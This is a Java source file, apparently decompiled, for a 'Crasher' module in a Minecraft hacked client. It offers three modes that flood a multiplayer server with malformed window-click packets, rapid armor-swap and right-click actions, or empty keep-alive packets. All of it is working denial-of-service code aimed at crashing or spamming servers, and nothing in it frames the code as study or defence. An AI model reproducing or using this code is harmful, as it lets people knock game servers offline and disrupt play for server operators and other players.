package dev.guinness.client.module.modules.exploit;

import net.minecraft.network.play.client.CPacketKeepAlive;
import net.minecraft.world.World;
import net.minecraft.util.EnumHand;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Items;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import dev.guinness.client.util.MessageUtil;
import dev.guinness.client.module.Category;
import dev.guinness.client.setting.SBoolean;
import dev.guinness.client.setting.SMode;
import dev.guinness.client.module.Module;

public class Crasher extends Module
{
    public static SMode mode;
    public static SBoolean debug;
    
    public Crasher() {
        super("Crasher", Category.EXPLOIT, "Various crashing modules");
    }
    
    @Override
    public void onUpdate() {
        if (Crasher.mc.getConnection() == null) {
            this.disable();
            return;
        }
        final String s = (String)Crasher.mode.getValue();
        switch (s) {
            case "OutOfBounds": {
                if (Crasher.debug.getValue()) {
                    MessageUtil.sendClientMessage("Running outofbounds");
                }
                for (int j = 0; j < 1000; ++j) {
                    final ItemStack item = new ItemStack(Crasher.mc.player.func_184614_ca().getItem());
                    final CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short)1);
                    try {
                        Crasher.mc.getConnection().sendPacket((Packet)packet);
                    }
                    catch (Exception ex) {}
                }
                break;
            }
            case "ArmorCrash": {
                if (Crasher.debug.getValue()) {
                    MessageUtil.sendClientMessage("Running armorcrash");
                }
                for (int i = 0; i < 300; ++i) {
                    if (Crasher.mc.player.field_71071_by.getStackInSlot(38).getItem() != Items.AIR) {
                        Crasher.mc.playerController.windowClick(Crasher.mc.player.field_71069_bz.windowId, 6, 0, ClickType.SWAP, (EntityPlayer)Crasher.mc.player);
                    }
                    Crasher.mc.playerController.processRightClick((EntityPlayer)Crasher.mc.player, (World)Crasher.mc.world, EnumHand.MAIN_HAND);
                }
                break;
            }
            case "ConsoleSpammer": {
                if (Crasher.debug.getValue()) {
                    MessageUtil.sendClientMessage("Running consolespammer");
                }
                for (int j = 0; j < 5; ++j) {
                    final CPacketKeepAlive packet2 = new CPacketKeepAlive();
                    try {
                        Crasher.mc.getConnection().sendPacket((Packet)packet2);
                    }
                    catch (Exception ex2) {}
                }
                break;
            }
        }
    }
    
    static {
        Crasher.mode = new SMode("Mode", new String[] { "OutOfBounds", "ArmorCrash", "ConsoleSpammer" });
        Crasher.debug = new SBoolean("DEBUG", false);
    }
}
